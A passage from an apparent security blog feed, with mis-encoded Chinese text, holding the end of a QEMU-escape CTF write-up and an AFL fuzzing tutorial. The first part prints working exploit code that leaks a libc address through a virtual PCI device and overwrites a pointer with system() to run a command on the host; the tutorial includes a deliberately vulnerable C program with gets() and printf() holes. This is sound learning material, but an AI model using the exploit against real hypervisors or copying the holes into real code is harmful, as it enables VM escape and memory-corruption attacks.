<span class="title">pmio_read</span><span class="params">(<span class="keyword">size_t</span> port)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> inl(port_base + port);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> key[<span class="number">4</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">size_t</span> <span class="title">tea</span><span class="params">(<span class="keyword">size_t</span> m)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">uint64_t</span> v3;</span><br><span class="line">    <span class="keyword">signed</span> <span class="keyword">int</span> v4;   <span class="comment">// esi</span></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">int</span> v5; <span class="comment">// ecx</span></span><br><span class="line">    <span class="keyword">uint64_t</span> result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">    v3 = m;</span><br><span class="line">    v4 = <span class="number">-957401312</span>;</span><br><span class="line">    v5 = v3;</span><br><span class="line">    result = v3 &gt;&gt; <span class="number">32</span>;</span><br><span class="line">    <span class="keyword">do</span></span><br><span class="line">    &#123;</span><br><span class="line">        result = result - ((v5 + v4) ^ (key[<span class="number">3</span>] + (v5 &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">2</span>] + <span class="number">16</span> * v5));</span><br><span class="line">        v5 -= (result + v4) ^ (key[<span class="number">1</span>] + ((<span class="keyword">unsigned</span> <span class="keyword">int</span>)result &gt;&gt; <span class="number">5</span>)) ^ (key[<span class="number">0</span>] + <span class="number">16</span> * result);</span><br><span class="line">        v4 += <span class="number">1640531527</span>;</span><br><span class="line">    &#125; <span class="keyword">while</span> (v4);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>, v5);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;0x%lx\n&quot;</span>, result);</span><br><span class="line">    <span class="keyword">return</span> result &lt;&lt; <span class="number">32</span> | (<span class="keyword">u_int64_t</span>)v5;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> mmio_fd = open(<span class="string">&quot;/sys/bus/pci/devices/0000:00:03.0/resource0&quot;</span>, O_RDWR | O_SYNC);</span><br><span class="line">    <span class="keyword">if</span> (mmio_fd == <span class="number">-1</span>)</span><br><span class="line">        die(<span class="string">&quot;mmio_fd open failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    mmio_mem = mmap(<span class="number">0</span>, <span class="number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (mmio_mem == MAP_FAILED)</span><br><span class="line">        die(<span class="string">&quot;mmap mmio_mem failed&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (iopl(<span class="number">3</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;iopl fail!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> rand_r;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> libc_base;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> system_addr;</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>, <span class="number">0x100</span>);</span><br><span class="line">    mmio_write(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, <span class="number">0</span>);</span><br><span class="line">    rand_r = mmio_read(<span class="number">0x18</span>);</span><br><span class="line"></span><br><span class="line">    rand_r += ((<span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span>)mmio_read(<span class="number">0x18</span>)) &lt;&lt; <span class="number">32</span>;</span><br><span class="line">    libc_base = rand_r - <span class="number">0x25d30</span>;</span><br><span class="line">    system_addr = libc_base + <span class="number">0x30290</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%p\n&quot;</span>, rand_r);</span><br><span class="line"></span><br><span class="line">    key[<span class="number">0</span>] = pmio_read(<span class="number">12</span>);</span><br><span class="line">    key[<span class="number">1</span>] = pmio_read(<span class="number">16</span>);</span><br><span class="line">    key[<span class="number">2</span>] = pmio_read(<span class="number">20</span>);</span><br><span class="line">    key[<span class="number">3</span>] = pmio_read(<span class="number">24</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;key%d: %p\n&quot;</span>, i, key[i]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="keyword">long</span> t_system_addr;</span><br><span class="line">    t_system_addr = tea(system_addr);</span><br><span class="line"></span><br><span class="line">    mmio_write(<span class="number">0x18</span>, t_system_addr &amp; <span class="number">0xffffffff</span>);</span><br><span class="line">    mmio_write(<span class="number">0x18</span>, t_system_addr &gt;&gt; <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">8</span>, <span class="number">0</span>);</span><br><span class="line">    mmio_write(<span class="number">0</span>, <span class="number">0x67616c66</span>);</span><br><span class="line"></span><br><span class="line">    pmio_write(<span class="number">28</span>, <span class="number">0x2f206c6e</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230321154453844.png"                      alt="image-20230321154453844"                ></p><hr><p>é¢˜ç›®é“¾æ¥:<br>    <a class="link"   href="https://github.com/196082/196082/tree/main/qemu_escape" >https://github.com/196082/196082/tree/main/qemu_escape<i class="fas fa-external-link-alt"></i></a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;å¯ä»¥çœ‹å¾—å‡ºæ¥è¿™ç¯‡æ–‡ç« çš„æ ‡é¢˜ååˆ†çš„æ°´ï¼Œå› ä¸ºç¡®å®æ˜¯å¾ˆéš¾æ‰¾åˆ°è¿™ä¸¤é“é¢˜åˆä»€ä¹ˆé—ªå…‰ç‚¹æ¥ä½œä¸ºæ ‡é¢˜ã€‚è¿™ç¯‡æ–‡ç« æ›´æ–°åä¼šæš‚åœå­¦ä¹ qemuäº†ï¼Œåç»­ä¼šè¿›ä¸€æ­¥å­¦ä¹ AFLä»¥åŠå¼€å§‹æ¥è§¦dockeré€ƒé€¸ã€‚&lt;/p&gt;
&lt;h2 id=&quot;FastCP-ctf&quot;&gt;&lt;a href=&quot;#FastCP-ctf&quot; cla</summary>
      
    
    
    
    <category term="qemu escape" scheme="https://cv196082.gitee.io/categories/qemu-escape/"/>
    
    
    <category term="mmio" scheme="https://cv196082.gitee.io/tags/mmio/"/>
    
    <category term="pmio" scheme="https://cv196082.gitee.io/tags/pmio/"/>
    
  </entry>
  
  <entry>
    <title>FUZZ(1):åˆæ¢AFL</title>
    <link href="https://cv196082.gitee.io/2023/03/18/%E5%88%9D%E6%8E%A2AFL/"/>
    <id>https://cv196082.gitee.io/2023/03/18/%E5%88%9D%E6%8E%A2AFL/</id>
    <published>2023-03-18T06:32:59.000Z</published>
    <updated>2023-03-18T07:33:05.013Z</updated>
    
    <content type="html"><![CDATA[<h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>æœ¬ç¯‡æ–‡ç« ä¸»è¦æ˜¯ä¸ºç½‘é¼æ¯çº¿ä¸‹èµ›åšå‡†å¤‡ï¼Œä¸ä¼šæ¶‰åŠåˆ°AFLçš„åŸç†ï¼Œä¸»è¦çš„æ–¹å‘ä¸ºAFLçš„ä½¿ç”¨ã€‚</p><h2 id="AFL-FUZZä»‹ç»"><a href="#AFL-FUZZä»‹ç»" class="headerlink" title="AFL-FUZZä»‹ç»"></a>AFL-FUZZä»‹ç»</h2><p>AFLåˆ™æ˜¯fuzzingçš„ä¸€ä¸ªå¾ˆå¥½ç”¨çš„å·¥å…·ï¼Œå…¨ç§°æ˜¯American Fuzzy Lopï¼Œç”±Googleå®‰å…¨å·¥ç¨‹å¸ˆMichaÅ‚ Zalewskiå¼€å‘çš„ä¸€æ¬¾å¼€æºfuzzingæµ‹è¯•å·¥å…·ï¼Œå¯ä»¥é«˜æ•ˆåœ°å¯¹äºŒè¿›åˆ¶ç¨‹åºè¿›è¡Œfuzzingï¼ŒæŒ–æ˜å¯èƒ½å­˜åœ¨çš„å†…å­˜å®‰å…¨æ¼æ´ï¼Œå¦‚æ ˆæº¢å‡ºã€å †æº¢å‡ºã€UAFã€double freeç­‰ã€‚ç”±äºéœ€è¦åœ¨ç›¸å…³ä»£ç å¤„æ’æ¡©ï¼Œå› æ­¤AFLä¸»è¦ç”¨äºå¯¹å¼€æºè½¯ä»¶è¿›è¡Œæµ‹è¯•ã€‚å½“ç„¶é…åˆQEMUç­‰å·¥å…·ï¼Œä¹Ÿå¯å¯¹é—­æºäºŒè¿›åˆ¶ä»£ç è¿›è¡Œfuzzingï¼Œä½†æ‰§è¡Œæ•ˆç‡ä¼šå—åˆ°å½±å“ã€‚</p><h2 id="ç™½ç›’ä¸‹çš„FUZZ"><a href="#ç™½ç›’ä¸‹çš„FUZZ" class="headerlink" title="ç™½ç›’ä¸‹çš„FUZZ"></a>ç™½ç›’ä¸‹çš„FUZZ</h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span> </span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;signal.h&gt;</span> </span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">vuln</span><span class="params">(<span class="keyword">char</span> *str)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> len = <span class="built_in">strlen</span>(str);</span><br><span class="line">    <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;A&#x27;</span> &amp;&amp; len == <span class="number">66</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//å¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²çš„é¦–å­—ç¬¦ä¸ºAå¹¶ä¸”é•¿åº¦ä¸º66ï¼Œåˆ™å¼‚å¸¸é€€å‡º</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(str[<span class="number">0</span>] == <span class="string">&#x27;F&#x27;</span> &amp;&amp; len == <span class="number">6</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        raise(SIGSEGV);</span><br><span class="line">        <span class="comment">//å¦‚æœè¾“å…¥çš„å­—ç¬¦ä¸²çš„é¦–å­—ç¬¦ä¸ºFå¹¶ä¸”é•¿åº¦ä¸º6ï¼Œåˆ™å¼‚å¸¸é€€å‡º</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;it is good!\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    gets(buf);<span class="comment">//å­˜åœ¨æ ˆæº¢å‡ºæ¼æ´</span></span><br><span class="line">    <span class="built_in">printf</span>(buf);<span class="comment">//å­˜åœ¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span></span><br><span class="line">    vuln(buf);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¤§æ¦‚æµç¨‹ï¼š</p><p>é¦–å…ˆæ˜¯ç”¨afl-gccç¼–è¯‘æºä»£ç è¿›è¡Œæ’æ¡©ï¼Œç„¶åä»¥æµ‹è¯•æ–‡ä»¶ä¸ºè¾“å…¥ï¼Œç„¶åå¯åŠ¨afl-fuzzç¨‹åºï¼Œå°†testcaseä½œä¸ºç¨‹åºçš„è¾“å…¥æ‰§è¡Œç¨‹åºï¼Œaflä¼šåœ¨è¿™ä¸ªtestcaseçš„åŸºç¡€ä¸Šè¿›è¡Œè‡ªåŠ¨å˜å¼‚è¾“å…¥ï¼Œä½¿å¾—ç¨‹åºäº§ç”Ÿcrashï¼Œäº§ç”Ÿäº†crashå°±ä¼šè¢«è®°å½•èµ·æ¥</p><h3 id="ç¼–è¯‘æ’æ¡©"><a href="#ç¼–è¯‘æ’æ¡©" class="headerlink" title="ç¼–è¯‘æ’æ¡©"></a>ç¼–è¯‘æ’æ¡©</h3><p>é¦–å…ˆæ˜¯é¢å¯¹ä¸Šé¢è¿™ç±»å°æ–‡ä»¶æ—¶é‡‡å–çš„æ–¹æ³•å°±æ˜¯ç›´æ¥è¿›è¡Œç¼–è¯‘</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-gcc -g -o <span class="built_in">test</span> test.c</span><br></pre></td></tr></table></figure><p>ä½†æ˜¯é¢å¯¹ç¼–è¯‘é¡¹ç›®æ—¶ï¼Œå¤§å¤šä¼šä½¿ç”¨åˆ°Makefileã€‚å¦‚æœå­˜åœ¨configureçš„è¯è‚¯å®šæ˜¯å¯ä»¥åœ¨é‡Œé¢ç›´æ¥è¿›è¡Œä¿®æ”¹ï¼Œå¦‚æœæ²¡æœ‰çš„è¯å¯ä»¥ç›´æ¥ä¿®æ”¹Makefileæˆ–è€…æ·»åŠ ä»¥ä¸‹å†…å®¹:</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CC=/path/to/afl/afl-gcc</span><br><span class="line">CXX=/path/to/afl/afl-g++</span><br></pre></td></tr></table></figure><p> å½“ç„¶é¢å¯¹clangæˆ–è€…clang++çš„è¯ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚</p><h3 id="å¼€å§‹FUZZ"><a href="#å¼€å§‹FUZZ" class="headerlink" title="å¼€å§‹FUZZ"></a>å¼€å§‹FUZZ</h3><p>å¯¹é‚£äº›å¯ä»¥ç›´æ¥ä»stdinè¯»å–è¾“å…¥çš„ç›®æ ‡ç¨‹åºæ¥è¯´ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program [â€¦paramsâ€¦]</span><br></pre></td></tr></table></figure><p>å¯¹ä»æ–‡ä»¶è¯»å–è¾“å…¥çš„ç›®æ ‡ç¨‹åºæ¥è¯´ï¼Œè¦ç”¨â€œ@@â€ï¼Œè¯­æ³•å¦‚ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./afl-fuzz -i testcase_dir -o findings_dir /path/to/program @@</span><br></pre></td></tr></table></figure><p>è€Œå¯¹äºè¿™é‡Œå‘½ä»¤ä¸º:<code>afl-fuzz -i input_dir -o output_dir ./test</code></p><p>å…¶ä¸­-ié€‰é¡¹æ—¶è¾“å…¥æµ‹è¯•æ–‡ä»¶çš„ç›®å½•ï¼Œ-oé€‰é¡¹æ—¶è¾“å‡ºç»“æœæ–‡ä»¶çš„ç›®å½•ã€‚</p><p>å¯¹äºè¿™ä¸ªç®€å•çš„ä¾‹å­ï¼Œæµ‹è¯•æ–‡ä»¶åªéœ€è¦éšä¾¿è¾“å…¥ç‚¹ä¸œè¥¿å°±è¡Œï¼Œè¿™é‡Œé€‰æ‹©è¾“å…¥<code>hello</code></p><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318133051229.png"                      alt="image-20230318133051229"                >ä¸€èˆ¬ä¼šå‡ºç°ä¸Šå›¾ä¸­çš„é—®é¢˜ï¼Œè§£å†³åŠæ³•å°±æ˜¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo su</span><br><span class="line"><span class="built_in">echo</span> core &gt;/proc/sys/kernel/core_pattern</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318134324644.png"                      alt="image-20230318134324644"                ></p><p>ä¸Šå›¾å°±æ˜¯AFLçš„ç•Œé¢ï¼Œä¸Šé¢çš„å†…å®¹æ ¹æ®å‰é¢çš„æ³¨é‡ŠåŸºæœ¬å¯ä»¥çŒœå‡ºæ¥ä¸€äºŒï¼Œä¸è¿‡è·‘äº†ååˆ†é’Ÿåªè·‘å‡ºäº†äº”å¤„crashå°±æŒºç¦»è°±çš„ï¼Œè¿™ä¸ªè·‘çš„ç»“æœä¸testcaseå’Œç”µè„‘æ€§èƒ½ä»¥åŠè¿æ°”éƒ½æœ‰ä¸€å®šå…³ç³»ã€‚</p><h3 id="åˆ†æcrashes"><a href="#åˆ†æcrashes" class="headerlink" title="åˆ†æcrashes"></a>åˆ†æcrashes</h3><h4 id="id-000000-sig-06-src-000001-op-havoc-rep-128æ ·ä¾‹"><a href="#id-000000-sig-06-src-000001-op-havoc-rep-128æ ·ä¾‹" class="headerlink" title="id:000000,sig:06,src:000001,op:havoc,rep:128æ ·ä¾‹"></a><strong>id:000000,sig:06,src:000001,op:havoc,rep:128æ ·ä¾‹</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">âœ  crashes xxd id:000000,sig:06,src:000001,op:havoc,rep:128 </span><br><span class="line">00000000: 8001 8001 92a8 c3e4 c3c3 c3fa c3ea e4c3  ................</span><br><span class="line">00000010: c3c3 fac3 ea04 2310 0423 1000 1010 0000  ......<span class="comment">#..#......</span></span><br><span class="line">00000020: 9b00 1000 009b 0100 f5f5 0423 1000 1010  ...........<span class="comment">#....</span></span><br><span class="line">00000030: 0000 9b00 1000 009b 0100 f5f5 f5f5 f5f5  ................</span><br><span class="line">00000040: f5f5 f5f5 f5f5 f5f5 f5f5 00fa 0423 1000  .............<span class="comment">#..</span></span><br><span class="line">00000050: 1000 0000 20f5 0064 1000 009b 0010 0000  .... ..d........</span><br><span class="line">00000060: 9b01 0001 92fa 0023 1000 1000 0003 2300  .......<span class="comment">#......#.</span></span><br><span class="line">00000070: 6410 0000 9b15                           d.....</span><br></pre></td></tr></table></figure><p>å¯ä»¥çŒœæµ‹ä¸ºæ ˆæº¢å‡º</p><h4 id="id-000001-sig-06-src-000001-op-havoc-rep-128æ ·ä¾‹"><a href="#id-000001-sig-06-src-000001-op-havoc-rep-128æ ·ä¾‹" class="headerlink" title="id:000001,sig:06,src:000001,op:havoc,rep:128æ ·ä¾‹"></a><strong>id:000001,sig:06,src:000001,op:havoc,rep:128æ ·ä¾‹</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">âœ  crashes xxd id:000001,sig:06,src:000001,op:havoc,rep:128 </span><br><span class="line">00000000: 7fb8 b7b8 207f 0001 7fb7 f9ff ffff f9ff  .... ...........</span><br><span class="line">00000010: ffff ff17 ffff ffff 7f7f 7fb7 f9ff ffff  ................</span><br><span class="line">00000020: f9ff ffff ff17 ffff ffff e0ff b8ff ffdd  ................</span><br><span class="line">00000030: b8b7 b8da 8008 00f9 fa00 00f9 f087 8080  ................</span><br><span class="line">00000040: 80ff f9ff ffff ff17 ffff ffff 7f7f 7fb7  ................</span><br><span class="line">00000050: f9ff ffff f9ff ffff ff17 ffff ffff ff80  ................</span><br><span class="line">00000060: 69b8 00d8 bdda 80b8 00d8 bdda ff7f 7fb8  i...............</span><br></pre></td></tr></table></figure><p>ä¸€æ ·çš„åº”è¯¥ä¹Ÿæ˜¯æ ˆæº¢å‡ºå¯¼è‡´çš„</p><h4 id="id-000002-sig-11-src-000000-op-flip1-pos-1æ ·ä¾‹"><a href="#id-000002-sig-11-src-000000-op-flip1-pos-1æ ·ä¾‹" class="headerlink" title="id:000002,sig:11,src:000000,op:flip1,pos:1æ ·ä¾‹"></a><strong>id:000002,sig:11,src:000000,op:flip1,pos:1æ ·ä¾‹</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">âœ  crashes xxd id:000002,sig:11,src:000000,op:flip1,pos:1  </span><br><span class="line">00000000: 7425 7374                                t%st</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåº”è¯¥æ˜¯æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¼•èµ·çš„crash</p><h4 id="id-000003-sig-11-src-000000-op-havoc-rep-64æ ·ä¾‹"><a href="#id-000003-sig-11-src-000000-op-havoc-rep-64æ ·ä¾‹" class="headerlink" title="id:000003,sig:11,src:000000,op:havoc,rep:64æ ·ä¾‹"></a><strong>id:000003,sig:11,src:000000,op:havoc,rep:64æ ·ä¾‹</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">âœ  crashes xxd id:000003,sig:11,src:000000,op:havoc,rep:64 </span><br><span class="line">00000000: 4662 4062 4040 0000 8040 7f40 1000 4040  Fb@b@@...@.@..@@</span><br><span class="line">00000010: 6240 4000 7740 407f 4040 8040 403f 6565  b@@.w@@.@@.@@?ee</span><br><span class="line">00000020: 6565 4044 4040 3340 403f 6565 6565 4040  ee@D@@3@@?eeee@@</span><br><span class="line">00000030: 4040 3340 4040 4040 40                   @@3@@@@@@</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåº”è¯¥æ˜¯ä»¥Få¼€å¤´ä¸”é•¿åº¦ä¸º6å¼•èµ·çš„crash</p><h4 id="id-000004-sig-11-src-000002-op-havoc-rep-8æ ·ä¾‹"><a href="#id-000004-sig-11-src-000002-op-havoc-rep-8æ ·ä¾‹" class="headerlink" title="id:000004,sig:11,src:000002,op:havoc,rep:8æ ·ä¾‹"></a><strong>id:000004,sig:11,src:000002,op:havoc,rep:8æ ·ä¾‹</strong></h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">âœ  crashes xxd id:000004,sig:11,src:000002,op:havoc,rep:8  </span><br><span class="line">00000000: 4141 4141 4141 4141 4141 4141 4141 4141  AAAAAAAAAAAAAAAA</span><br><span class="line">00000010: 4141 4141 1e41 4141 4141 4141 4141 4132  AAAA.AAAAAAAAAA2</span><br><span class="line">00000020: 4141 4141 4141 1e41 4141 4141 4141 4141  AAAAAA.AAAAAAAAA</span><br><span class="line">00000030: 4141 4141 4141 4141 4141 4141 412a 4134  AAAAAAAAAAAAA*A4</span><br><span class="line">00000040: 41b8                                     A.</span><br></pre></td></tr></table></figure><p>è¿™é‡Œåº”è¯¥æ˜¯ä»¥Aå¼€å¤´å¹¶ä¸”é•¿åº¦ä¸º66å¼•èµ·çš„crash</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>å¯ä»¥çœ‹åˆ°ä¸Šé¢äº”ä¸ªæ ·ä¾‹åŸºæœ¬è¦†ç›–äº†æºç ä¸­å­˜åœ¨çš„æ¼æ´ã€‚</p><h2 id="é»‘ç›’ä¸‹çš„FUZZ"><a href="#é»‘ç›’ä¸‹çš„FUZZ" class="headerlink" title="é»‘ç›’ä¸‹çš„FUZZ"></a>é»‘ç›’ä¸‹çš„FUZZ</h2><blockquote><p>  é»‘ç›’æ¨¡å¼éœ€è¦ä½¿ç”¨qemu_modeï¼Œæ‰€ä»¥æœ€å¥½ä»å¼€å§‹å°±ä½¿ç”¨æºç è¿›è¡Œç¼–è¯‘ï¼Œè¿™é‡Œå¯èƒ½ä¼šå‡ºç°å¾ˆå¤šé—®é¢˜ï¼Œå¤§å¤šéƒ½å¯ä»¥åœ¨ç½‘ä¸Šæœåˆ°è§£å†³åŠæ³•</p></blockquote><p>è¿™é‡Œç›´æ¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤è¿›è¡Œç¼–è¯‘ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gcc -g ./test.c -o <span class="built_in">test</span></span><br></pre></td></tr></table></figure><h3 id="å¼€å§‹FUZZ-1"><a href="#å¼€å§‹FUZZ-1" class="headerlink" title="å¼€å§‹FUZZ"></a>å¼€å§‹FUZZ</h3><p>è¿™é‡Œçš„FUZZé€‰é¡¹ç•¥æœ‰ä¸åŒï¼Œéœ€è¦åŠ ä¸Š-Qé€‰é¡¹ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">afl-fuzz -i ./input_dir -o ./output_dir -Q ./<span class="built_in">test</span></span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318141300808.png"                      alt="image-20230318141300808"                ></p><p>è™½ç„¶å¯ä»¥çœ‹åˆ°è¿™é‡Œè¢«ä¿å­˜çš„crashesæœ‰6ä¸ªï¼Œæ¯”ä¸Šé¢çš„è¿˜å¤šä¸€ä¸ªï¼Œä½†æ˜¯çœ‹total crashesè¿œè¿œå°‘äºä¸Šé¢çš„ã€‚å¯ä»¥çœ‹å‡ºæ¥ç”¨qemuçš„æ€§èƒ½è¿œè¿œå°äºæ’æ¡©çš„ã€‚</p><p>è¿™é‡Œå°±ä¸å†åˆ†æè¾“å‡ºçš„crashesæ–‡ä»¶äº†ã€‚</p><h2 id="æ–‡ä»¶è¯»å–è¾“å…¥çš„æƒ…å†µ"><a href="#æ–‡ä»¶è¯»å–è¾“å…¥çš„æƒ…å†µ" class="headerlink" title="æ–‡ä»¶è¯»å–è¾“å…¥çš„æƒ…å†µ"></a>æ–‡ä»¶è¯»å–è¾“å…¥çš„æƒ…å†µ</h2><p>é¦–å…ˆåšä»¥ä¸‹å‡†å¤‡</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">âœ  input_dir mkdir file</span><br><span class="line">âœ  input_dir cp ../../testcases/others/elf/small_exec.elf ./file</span><br><span class="line">âœ  afl_test cp /usr/bin/readelf ./</span><br></pre></td></tr></table></figure><p>éšåç›´æ¥è¿›è¡Œfuzz</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">../afl-fuzz -i ./input_dir/file -o ./output_dir -Q ./readelf -a @@</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/images/image-20230318142936126.png"                      alt="image-20230318142936126"                >è·‘äº†ååˆ†é’Ÿä¸€æ¬¡crashéƒ½æ²¡æœ‰çš„ï¼Œå½“ç„¶è·‘å†ä¹…åº”è¯¥ä¹Ÿæ˜¯ä¸€æ 